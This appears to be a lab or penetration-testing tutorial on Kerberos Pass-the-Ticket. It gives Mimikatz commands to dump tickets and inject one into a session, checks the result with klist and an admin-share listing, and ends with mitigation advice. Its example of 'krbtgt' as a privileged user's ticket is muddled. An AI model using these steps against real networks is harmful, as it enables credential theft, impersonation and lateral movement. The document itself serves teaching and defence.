
**Type:** Kerberos Attack  
**Tool:** Mimikatz / Rubeus  
**Goal:** Reuse a Kerberos ticket to impersonate the account associated with that ticket.

Pass-the-Ticket (PtT) allows an attacker who has obtained a valid Kerberos ticket to inject it into their current Windows session and authenticate as the ticket's owner.

> **Lab/engagement note:** Ticket extraction generally requires an elevated Administrator context, especially when accessing credentials/tickets held by other sessions.

---

## 1. Prepare Mimikatz

Run **Command Prompt as Administrator**.

Navigate to the directory containing Mimikatz:

```cmd
cd Downloads
```

Run Mimikatz:
```cmd
mimikatz.exe
```

Enable the debug privilege:
```text
privilege::debug
```

Expected:
```text
Privilege '20' OK
```

If this fails, the current process does not have the required privileges.

---

## 2. Dump Kerberos Tickets

Export tickets from the current system:
```text
sekurlsa::tickets /export
```

This exports Kerberos tickets as `.kirbi` files into the export current directory.

Example:
```text
0-0-00-00000000-user@domain.local.kirbi
```

### Alternative: Rubeus

If tickets were previously harvested with Rubeus, the Base64-encoded ticket can also be converted/used as a `.kirbi` ticket.

When selecting a ticket, look for a **TGT** belonging to a privileged account.

For example:
```text
krbtgt
```

A privileged user's TGT can potentially provide the privileges associated with that account.

---

# 3. Pass the Ticket

Inside Mimikatz, inject the ticket into the current logon session:
```text
kerberos::ptt <ticket.kirbi>
```

Example:
```text
kerberos::ptt administrator@domain.local.kirbi
```

Mimikatz loads the ticket into the current Kerberos cache.

---

## 4. Verify the Ticket

Exit Mimikatz and use Windows `klist`:
```cmd
klist
```

This displays the Kerberos tickets currently cached in the session.

Look for the injected ticket and verify that it belongs to the account you intended to impersonate.

---

## 5. Verify Access

The permissions available after PtT depend on the privileges of the impersonated account.

For example, if the injected ticket belongs to an account with administrative access to another machine, test access to an administrative SMB share:

```cmd
dir \\TARGET\C$
```

If access is successful, the Kerberos ticket is being used for authentication.

---

# Attack Flow

```text
Obtain privileged Kerberos ticket
            ↓
Export / obtain .kirbi ticket
            ↓
Inject ticket with Mimikatz
            ↓
Kerberos ticket appears in cache
            ↓
Authenticate as ticket owner
            ↓
Access resources available to that account
```

---

# Important Points

- **PtT abuses Kerberos tickets**, not the user's plaintext password.
- `.kirbi` files commonly contain serialized Kerberos tickets.
- `sekurlsa::tickets /export` exports tickets available to Mimikatz.
- `kerberos::ptt` injects a ticket into the current session.
- `klist` is used to inspect the current Kerberos cache.
- The resulting privileges depend on the **account represented by the ticket**.
- A privileged TGT can be particularly dangerous because it can allow authentication as a highly privileged account.
    

---

# Mitigation

### 1. Protect privileged accounts

Do not allow Domain Admin accounts to routinely log onto normal workstations or low-trust servers.

A compromised workstation containing a privileged user's Kerberos tickets can become a stepping stone for lateral movement.

### 2. Use dedicated administration systems

Use dedicated privileged-access workstations or hardened administrative systems for Domain Admin activities.

### 3. Reduce privileged logons

Avoid unnecessary interactive logons with highly privileged accounts.

### 4. Monitor Kerberos activity

Monitor for suspicious:
- Ticket requests
- Ticket injection
- Abnormal use of privileged accounts
- Lateral movement using administrative shares
- Privileged accounts authenticating to unusual systems

### Key Point

> **Pass-the-Ticket = obtain a valid Kerberos ticket → inject it into your session → authenticate as the ticket's owner.**